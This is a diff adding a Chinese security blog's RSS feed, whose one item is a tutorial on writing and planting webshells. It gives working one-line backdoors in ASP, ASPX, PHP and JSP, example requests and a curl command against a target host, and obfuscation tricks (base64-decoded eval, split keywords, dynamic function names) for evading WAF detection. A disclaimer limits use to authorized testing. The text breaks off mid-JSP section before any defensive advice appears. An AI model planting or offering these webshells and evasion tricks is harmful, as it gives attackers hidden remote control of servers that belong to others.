@@ -1,0 +1,393 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>bae的博客 • Posts by &#34;蚁剑&#34; tag</title>
+        <link>https://bae-ace.github.io</link>
+        <description>bae的个人博客</description>
+        <language>zh-CN</language>
+        <pubDate>Mon, 04 Aug 2025 21:25:51 +0800</pubDate>
+        <lastBuildDate>Mon, 04 Aug 2025 21:25:51 +0800</lastBuildDate>
+        <category>PWN</category>
+        <category>ELF</category>
+        <category>ROP</category>
+        <category>CTF</category>
+        <category>二进制安全</category>
+        <category>Web安全</category>
+        <category>Solr</category>
+        <category>XXE</category>
+        <category>漏洞复现</category>
+        <category>Vulhub</category>
+        <category>Kali</category>
+        <category>PHP</category>
+        <category>SSRF</category>
+        <category>Struts2</category>
+        <category>RCE</category>
+        <category>OGNL注入</category>
+        <category>权限绕过</category>
+        <category>水平越权</category>
+        <category>垂e直越权</category>
+        <category>Pikachu靶场</category>
+        <category>工具</category>
+        <category>sqlmap</category>
+        <category>渗透测试</category>
+        <category>SQL注入</category>
+        <category>网络安全</category>
+        <category>ThinkPHP</category>
+        <category>WebShell</category>
+        <category>蚁剑</category>
+        <category>冰蝎</category>
+        <category>漏洞利用</category>
+        <category>hexo</category>
+        <category>博客搭建</category>
+        <category>初始测试</category>
+        <category>linux</category>
+        <category>命令</category>
+        <category>命令执行</category>
+        <category>信息收集</category>
+        <category>子域名</category>
+        <item>
+            <guid isPermalink="true">https://bae-ace.github.io/2025/08/04/WebShell-%E5%BF%AB%E9%80%9F%E6%A4%8D%E5%85%A5%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%9AASP-ASPX-PHP-JSP-JSPX/</guid>
+            <title>WebShell 快速植入与绕过：ASP/ASPX/PHP/JSP/JSPX</title>
+            <link>https://bae-ace.github.io/2025/08/04/WebShell-%E5%BF%AB%E9%80%9F%E6%A4%8D%E5%85%A5%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%9AASP-ASPX-PHP-JSP-JSPX/</link>
+            <category>Web安全</category>
+            <category>WebShell</category>
+            <category>蚁剑</category>
+            <category>冰蝎</category>
+            <category>漏洞利用</category>
+            <pubDate>Mon, 04 Aug 2025 21:25:51 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;WebShell-快速植入与绕过：ASP-ASPX-PHP-JSP-JSPX-详解&#34;&gt;&lt;a href=&#34;#WebShell-快速植入与绕过：ASP-ASPX-PHP-JSP-JSPX-详解&#34; class=&#34;headerlink&#34; title=&#34;WebShell 快速植入与绕过：ASP&amp;#x2F;ASPX&amp;#x2F;PHP&amp;#x2F;JSP&amp;#x2F;JSPX 详解&#34;&gt;&lt;/a&gt;WebShell 快速植入与绕过：ASP&amp;#x2F;ASPX&amp;#x2F;PHP&amp;#x2F;JSP&amp;#x2F;JSPX 详解&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WebShell&lt;/strong&gt; 是一种通过 Web 接口执行服务器命令的恶意脚本，常用于渗透测试或攻击中，以获取服务器控制权。它以简单、隐蔽和高危著称，常配合工具如&lt;strong&gt;蚁剑&lt;/strong&gt;或&lt;strong&gt;冰蝎&lt;/strong&gt;使用。本文详细讲解 ASP、ASPX、PHP、JSP 和 JSPX 五种常见 WebShell 的编写、植入、利用方式及绕过技巧，旨在帮助安全从业者掌握 WebShell 的原理和使用方法，同时提供防护建议。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅限合法授权的渗透测试和安全研究，严禁用于非法攻击！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;学习目标&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;掌握不同语言（ASP&amp;#x2F;ASPX&amp;#x2F;PHP&amp;#x2F;JSP&amp;#x2F;JSPX）WebShell 的编写与使用&lt;/li&gt;
+&lt;li&gt;学会配合蚁剑、冰蝎等工具提升利用效率&lt;/li&gt;
+&lt;li&gt;理解 WebShell 绕过检测的技巧&lt;/li&gt;
+&lt;li&gt;了解防御 WebShell 的最佳实践&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;二、WebShell-概述&#34;&gt;&lt;a href=&#34;#二、WebShell-概述&#34; class=&#34;headerlink&#34; title=&#34;二、WebShell 概述&#34;&gt;&lt;/a&gt;二、WebShell 概述&lt;/h2&gt;&lt;h3 id=&#34;1-什么是-WebShell？&#34;&gt;&lt;a href=&#34;#1-什么是-WebShell？&#34; class=&#34;headerlink&#34; title=&#34;1. 什么是 WebShell？&#34;&gt;&lt;/a&gt;1. 什么是 WebShell？&lt;/h3&gt;&lt;p&gt;WebShell 是一种部署在 Web 服务器上的脚本文件，通过 HTTP 请求（如 GET、POST）接收用户输入的命令并在服务器执行，通常用于：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;执行系统命令（如 &lt;code&gt;whoami&lt;/code&gt;、&lt;code&gt;net user&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;文件管理（上传、下载、修改）&lt;/li&gt;
+&lt;li&gt;反弹 Shell 或持久化控制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-危害&#34;&gt;&lt;a href=&#34;#2-危害&#34; class=&#34;headerlink&#34; title=&#34;2. 危害&#34;&gt;&lt;/a&gt;2. 危害&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;权限提升&lt;/strong&gt;：获取服务器高权限（如 SYSTEM&amp;#x2F;root）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据泄露&lt;/strong&gt;：窃取配置文件、数据库等&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;持久控制&lt;/strong&gt;：植入后门，长期潜伏&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;系统破坏&lt;/strong&gt;：删除关键文件或执行恶意操作&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-配合工具&#34;&gt;&lt;a href=&#34;#3-配合工具&#34; class=&#34;headerlink&#34; title=&#34;3. 配合工具&#34;&gt;&lt;/a&gt;3. 配合工具&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;蚁剑（AntSword）&lt;/strong&gt;：开源 WebShell 管理工具，支持多语言，界面友好。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;冰蝎（Behinder）&lt;/strong&gt;：加密传输，隐蔽性强，适合高级渗透。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;菜刀&lt;/strong&gt;：经典工具，适合简单场景。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;三、WebShell-编写与利用&#34;&gt;&lt;a href=&#34;#三、WebShell-编写与利用&#34; class=&#34;headerlink&#34; title=&#34;三、WebShell 编写与利用&#34;&gt;&lt;/a&gt;三、WebShell 编写与利用&lt;/h2&gt;&lt;p&gt;以下详细介绍 ASP、ASPX、PHP、JSP 和 JSPX 的 WebShell 示例，包括语法、调用方式、回显特性及注意事项。&lt;/p&gt;
+&lt;h3 id=&#34;1-ASP-WebShell&#34;&gt;&lt;a href=&#34;#1-ASP-WebShell&#34; class=&#34;headerlink&#34; title=&#34;1. ASP WebShell&#34;&gt;&lt;/a&gt;1. ASP WebShell&lt;/h3&gt;&lt;h4 id=&#34;示例代码&#34;&gt;&lt;a href=&#34;#示例代码&#34; class=&#34;headerlink&#34; title=&#34;示例代码&#34;&gt;&lt;/a&gt;示例代码&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;编号&lt;/th&gt;
+&lt;th&gt;示例代码&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;①&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;% eval(request(&amp;quot;2&amp;quot;)) %&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;经典 eval 执行用户输入&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;②&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;% execute request(&amp;quot;3&amp;quot;) %&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;执行传入参数命令&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;③&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;% execute(request(&amp;quot;4&amp;quot;)) %&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;等价于②，参数名不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;④&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;% executeglobal request(&amp;quot;5&amp;quot;) %&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;全局执行脚本&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;⑤&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;% executeglobal(request(&amp;quot;6&amp;quot;)) %&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;同④，参数名不同&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h4 id=&#34;调用方式&#34;&gt;&lt;a href=&#34;#调用方式&#34; class=&#34;headerlink&#34; title=&#34;调用方式&#34;&gt;&lt;/a&gt;调用方式&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;保存为 &lt;code&gt;shell.asp&lt;/code&gt;，上传至目标服务器。&lt;/li&gt;
+&lt;li&gt;请求示例：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;http://target.com/shell.asp?&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;=Response.&lt;span class=&#34;hljs-built_in&#34;&gt;Write&lt;/span&gt;(Server.&lt;span class=&#34;hljs-built_in&#34;&gt;MapPath&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;))&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;参数&lt;/strong&gt;：&lt;code&gt;3&lt;/code&gt; 为命令参数，支持任意 ASP 代码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;特点&#34;&gt;&lt;a href=&#34;#特点&#34; class=&#34;headerlink&#34; title=&#34;特点&#34;&gt;&lt;/a&gt;特点&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;回显&lt;/strong&gt;：无（需工具配合，如蚁剑）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;优缺点&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;简单易用，但 &lt;code&gt;eval&lt;/code&gt; 和 &lt;code&gt;execute&lt;/code&gt; 易被 WAF 检测。&lt;/li&gt;
+&lt;li&gt;适合快速测试，需混淆以提高隐蔽性。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;绕过建议&#34;&gt;&lt;a href=&#34;#绕过建议&#34; class=&#34;headerlink&#34; title=&#34;绕过建议&#34;&gt;&lt;/a&gt;绕过建议&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;使用 Base64 编码参数：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asp&#34;&gt;&amp;lt;% execute(Base64Decode(request(&amp;quot;cmd&amp;quot;))) %&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;分割关键词：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asp&#34;&gt;&amp;lt;% ex=&amp;quot;exec&amp;quot;; ex&amp;amp;&amp;quot;ute&amp;quot; request(&amp;quot;cmd&amp;quot;) %&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-ASPX-WebShell&#34;&gt;&lt;a href=&#34;#2-ASPX-WebShell&#34; class=&#34;headerlink&#34; title=&#34;2. ASPX WebShell&#34;&gt;&lt;/a&gt;2. ASPX WebShell&lt;/h3&gt;&lt;h4 id=&#34;示例代码-1&#34;&gt;&lt;a href=&#34;#示例代码-1&#34; class=&#34;headerlink&#34; title=&#34;示例代码&#34;&gt;&lt;/a&gt;示例代码&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs aspx&#34;&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;% eval(Request[&amp;quot;1&amp;quot;], &amp;quot;unsafe&amp;quot;); %&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;调用方式-1&#34;&gt;&lt;a href=&#34;#调用方式-1&#34; class=&#34;headerlink&#34; title=&#34;调用方式&#34;&gt;&lt;/a&gt;调用方式&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;保存为 &lt;code&gt;shell.aspx&lt;/code&gt;，上传至目标服务器。&lt;/li&gt;
+&lt;li&gt;请求示例：&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;http://target.com/shell.aspx?&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;=Response.&lt;span class=&#34;hljs-built_in&#34;&gt;Write&lt;/span&gt;(System.IO.Directory.&lt;span class=&#34;hljs-built_in&#34;&gt;GetCurrentDirectory&lt;/span&gt;())&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数&lt;/strong&gt;：&lt;code&gt;1&lt;/code&gt; 为 C# 代码，运行在 &lt;code&gt;unsafe&lt;/code&gt; 模式。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;特点-1&#34;&gt;&lt;a href=&#34;#特点-1&#34; class=&#34;headerlink&#34; title=&#34;特点&#34;&gt;&lt;/a&gt;特点&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;回显&lt;/strong&gt;：无（需工具配合）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;优缺点&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;支持 C# 强大功能，但需服务器启用 &lt;code&gt;unsafe&lt;/code&gt; 模式。&lt;/li&gt;
+&lt;li&gt;隐蔽性较 ASP 稍高，但仍需混淆。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;绕过建议-1&#34;&gt;&lt;a href=&#34;#绕过建议-1&#34; class=&#34;headerlink&#34; title=&#34;绕过建议&#34;&gt;&lt;/a&gt;绕过建议&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;使用复杂参数名：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs aspx&#34;&gt;&amp;lt;% eval(Request[HttpUtility.UrlDecode(&amp;quot;x&amp;quot;)], &amp;quot;unsafe&amp;quot;); %&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;结合加密传输（如 Base64 或 AES）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-PHP-WebShell&#34;&gt;&lt;a href=&#34;#3-PHP-WebShell&#34; class=&#34;headerlink&#34; title=&#34;3. PHP WebShell&#34;&gt;&lt;/a&gt;3. PHP WebShell&lt;/h3&gt;&lt;h4 id=&#34;示例代码-2&#34;&gt;&lt;a href=&#34;#示例代码-2&#34; class=&#34;headerlink&#34; title=&#34;示例代码&#34;&gt;&lt;/a&gt;示例代码&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;编号&lt;/th&gt;
+&lt;th&gt;示例代码&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;①&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;?php eval($_REQUEST[&amp;#39;1&amp;#39;]); ?&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;支持 GET&amp;#x2F;POST&amp;#x2F;Cookie 参数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;②&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;?php eval($_GET[&amp;#39;2&amp;#39;]); ?&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;指定 GET 参数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;③&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;?php eval($_POST[&amp;#39;3&amp;#39;]); ?&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;指定 POST 参数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;④&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;?php assert($_REQUEST[&amp;#39;4&amp;#39;]); ?&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;使用 assert 执行表达式&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;⑤&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;?php assert($_GET[&amp;#39;5&amp;#39;]); ?&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;GET 参数下的 assert&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;⑥&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;?php assert($_POST[&amp;#39;6&amp;#39;]); ?&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;POST 参数下的 assert&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h4 id=&#34;调用方式-2&#34;&gt;&lt;a href=&#34;#调用方式-2&#34; class=&#34;headerlink&#34; title=&#34;调用方式&#34;&gt;&lt;/a&gt;调用方式&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;保存为 &lt;code&gt;shell.php&lt;/code&gt;，上传至目标服务器。&lt;/li&gt;
+&lt;li&gt;请求示例（使用 &lt;code&gt;curl&lt;/code&gt;）：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;curl http://target.com/shell.php -d &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;3=system(&amp;#x27;whoami&amp;#x27;);&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数&lt;/strong&gt;：&lt;code&gt;3&lt;/code&gt; 为 PHP 代码或命令。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;特点-2&#34;&gt;&lt;a href=&#34;#特点-2&#34; class=&#34;headerlink&#34; title=&#34;特点&#34;&gt;&lt;/a&gt;特点&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;回显&lt;/strong&gt;：有（直接输出命令结果）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;优缺点&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;最通用，兼容性强，适合蚁剑&amp;#x2F;冰蝎。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;eval&lt;/code&gt; 和 &lt;code&gt;assert&lt;/code&gt; 易被检测，需混淆。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;绕过建议-2&#34;&gt;&lt;a href=&#34;#绕过建议-2&#34; class=&#34;headerlink&#34; title=&#34;绕过建议&#34;&gt;&lt;/a&gt;绕过建议&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;使用 &lt;code&gt;base64_decode&lt;/code&gt; 混淆：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;])); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;动态函数调用：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;sys&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;tem&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$f&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-JSP-WebShell&#34;&gt;&lt;a href=&#34;#4-JSP-WebShell&#34; class=&#34;headerlink&#34; title=&#34;4. JSP WebShell&#34;&gt;&lt;/a&gt;4. JSP WebShell&lt;/h3&gt;&lt;h4 id=&#34;示例代码-3&#34;&gt;&lt;a href=&#34;#示例代码-3&#34; class=&#34;headerlink&#34; title=&#34;示例代码&#34;&gt;&lt;/a&gt;示例代码&lt;/h4&gt;&lt;figure class=&#34;highlight jsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsp&#34;&gt;&amp;lt;%@ page language=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;java&amp;quot;&lt;/span&gt; contentType=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;text/html; charset=UTF-8&amp;quot;&lt;/span&gt; pageEncoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;%&amp;gt;&lt;br&gt;&amp;lt;% Runtime.getRuntime().exec(request.getParameter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt;)); %&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;调用方式-3&#34;&gt;&lt;a href=&#34;#调用方式-3&#34; class=&#34;headerlink&#34; title=&#34;调用方式&#34;&gt;&lt;/a&gt;调用方式&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;保存为 &lt;code&gt;shell.jsp&lt;/code&gt;，上传至目标服务器。&lt;/li&gt;
+&lt;li&gt;请求示例：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;http://target.com/shell.jsp?i=&lt;span class=&#34;hljs-built_in&#34;&gt;whoami&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数&lt;/strong&gt;：&lt;code&gt;i&lt;/code&gt; 为系统命令。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;特点-3&#34;&gt;&lt;a href=&#34;#特点-3&#34; class=&#34;headerlink&#34; title=&#34;特点&#34;&gt;&lt;/a&gt;特点&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;回显&lt;/strong&gt;：无（需配合反弹 Shell）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;优缺点&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;简单直接，执行系统命令。&lt;/li&gt;
+&lt;li&gt;无回显，需工具或反弹 Shell。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;绕过建议-3&#34;&gt;&lt;a href=&#34;#绕过建议-3&#34; class=&#34;headerlink&#34; title=&#34;绕过建议&#34;&gt;&lt;/a&gt;绕过建议&lt;/h4&gt;&lt;ul&gt;
